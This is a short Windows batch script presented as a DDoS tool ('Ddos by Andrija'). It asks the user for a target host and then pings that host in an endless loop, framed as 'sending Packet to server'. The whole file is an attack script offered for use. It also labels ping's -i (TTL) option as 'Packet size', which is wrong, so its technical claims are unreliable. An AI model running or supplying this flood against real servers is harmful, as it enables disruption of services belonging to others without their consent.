@echo off
mode 67,16
Title Ddos by Andrija
color 05
cls
echo.
echo ------------------------------------------------------
echo Ddos batch made by Andrija
echo ------------------------------------------------------
echo.
set /p T=Target URL:
echo.
echo ------------------------------------------------------
echo.
ping %T%
echo.
echo ------------------------------------------------------
@ping.exe 127.0.0.1 -n 5 -w 40000 > nul
goto next
:next
echo.
echo.
set /P m=IP host:
echo.
set /p n=Packet size:
echo.
:DDOS
color 0c
echo sending Packet to server %m%
ping %m% -i %n% -t >nul
goto DDOS

